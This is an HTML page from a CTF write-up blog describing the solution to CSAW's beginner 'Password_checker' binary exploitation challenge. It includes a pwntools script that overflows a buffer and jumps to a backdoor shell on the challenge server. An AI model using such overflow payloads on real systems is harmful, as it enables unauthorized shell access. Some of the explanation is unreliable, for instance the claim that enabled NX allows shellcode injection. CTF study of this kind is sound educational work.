@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Lucas Sass Rósinberg]">
+<meta name="description" content="Password_Checker: Intro: Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)
+Netcat:nc pwn.chal.csaw.io 5000
+File: password_checker
+Go through The first hint you get is that this is for someone who hasn&amp;rsquo;t solved a binary exploit before therefore we know a good place too look is at the file which we recieved." />
+<meta name="keywords" content="CTF" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/password_checker/" />
+
+
+    <title>
+        
+            CSAW: Password_checker :: Hello Friend  — A Simple CTF Writeup site/blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/Lucassass/CTF-Writeups.github.io/main.17863a81d979b637a02cd7632a4d86e9d80563ef460fd6af1a56962efcaa066b.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/Lucassass/CTF-Writeups.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/Lucassass/CTF-Writeups.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/Lucassass/CTF-Writeups.github.io/favicon-16x16.png">
+    <link rel="manifest" href="/Lucassass/CTF-Writeups.github.io/site.webmanifest">
+    <link rel="mask-icon" href="/Lucassass/CTF-Writeups.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/Lucassass/CTF-Writeups.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="CSAW: Password_checker">
+<meta itemprop="description" content="Password_Checker: Intro: Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)
+Netcat:nc pwn.chal.csaw.io 5000
+File: password_checker
+Go through The first hint you get is that this is for someone who hasn&rsquo;t solved a binary exploit before therefore we know a good place too look is at the file which we recieved."><meta itemprop="datePublished" content="2021-09-10T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-09-10T00:00:00+00:00" />
+<meta itemprop="wordCount" content="526">
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSAW: Password_checker"/>
+<meta name="twitter:description" content="Password_Checker: Intro: Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)
+Netcat:nc pwn.chal.csaw.io 5000
+File: password_checker
+Go through The first hint you get is that this is for someone who hasn&rsquo;t solved a binary exploit before therefore we know a good place too look is at the file which we recieved."/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-09-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/Lucassass/CTF-Writeups.github.io" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello friend</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/Lucassass/CTF-Writeups.github.io/about">About</a></li><li><a href="/Lucassass/CTF-Writeups.github.io/posts">posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        3 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/password_checker/">CSAW: Password_checker</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="password_checker">Password_Checker:</h1>
+<h2 id="intro">Intro:</h2>
+<p>Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)</p>
+<p>Netcat:nc pwn.chal.csaw.io 5000</p>
+<p>File: password_checker</p>
+<h2 id="go-through">Go through</h2>
+<p>The first hint you get is that this is for someone who hasn&rsquo;t solved a binary exploit before therefore we know a good place too look is at the file which we recieved. You can therefore start by using a tool to check the file for information about it I used GDB</p>
+<p>So, in terminal run:<code>gdb password_checker</code></p>
+<p>Here you get the info</p>
+<pre tabindex="0"><code>adding symbols from password_checker...
+I'm sorry, Dave, I can't do that.  Symbol format ´elf64-x86-64´ unknown.
+</code></pre><p>So from this we learn that the file is of the elf64-x86-64 format. elf is Executable and Linkable Format 64 bit</p>
+<p>Now that we now it is a executable we can try using the tool checksec, when we run checksec on the binary:</p>
+<p><code>checksec --file=password_checker</code></p>
+<p>Then we get the information that there is no canary found, nx is enabled, no PIE, no RPATH</p>
+<p>So here we learn that nx is enabled the NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data.</p>
+<p>This means we can try and do bufferoverflow meaning we will try to put more data into a fixed-lenght buffer than the buffer can handle and thereby be able to do code execution by shellcode injection.</p>
+<p>So I used a reverse engineering tool called Cutter to decompile the binary file to get some information we are gonna use in the buffer overflow.</p>
+<p>Here I find a backdoor which looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">backdoor</span>(<span style="color:#66d9ef">void</span>)
+{
+    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>We can then use cutter to get the instruction address which in this case is 0x0040117d, we can then use pwn tools to process our binary file and send our specific line which we specify to overflow. Then we can specify the address for the information which we want usinger pointers in order to be able to connect via netcat.</p>
+<p>once we have perfected the bufferoverflow we can try and edit our script to execute the remote on the netcat server which is listening for the password.</p>
+<p>Then if everything was done correctly you can type whoami and then you will be able to see nobody which tells you who you are you can then try typing ls to see what are in the directory, and there you will find the flag.txt, you can then cat the txt file to get the flag.</p>
+<h3 id="python-script-used">Python Script used:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#pip install pwn</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./password_checker&#34;</span>)
+<span style="color:#75715e">#doesn&#39;t need to run remote before we have perfected the bufferoverflow</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwn.chal.csaw.io&#39;</span>,<span style="color:#ae81ff">5000</span>)
+p<span style="color:#f92672">.</span>sendline (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x84\x11\x40\x00\x00\x00\x00\x00\x72\x11\x40\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h1 id="tools-used">Tools used</h1>
+<h4 id="gdb">GDB</h4>
+<p>Gnu project debugger <a href="https://www.gnu.org/software/gdb/">https://www.gnu.org/software/gdb/</a></p>
+<h4 id="checksec">Checksec</h4>
+<p>checksec is a bash script to check the properties of executables (like PIE, RELRO, PaX, Canaries, ASLR, Fortify Source) <a href="https://github.com/slimm609/checksec.sh">https://github.com/slimm609/checksec.sh</a></p>
+<h4 id="cutter">cutter</h4>
+<p><a href="http://cutter.re">http://cutter.re</a> is a free open source RE platform, used to convert assembly into something that looks like C</p>
+<p>pwn is a gdb wrapper <a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        526 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-09-10 02:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/stegbot/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">BuckEye: Stegbot</span>
+                </a>
+            </span>
+            
+
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/Lucassass/CTF-Writeups.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+
+
+
+    </body>
+</html>
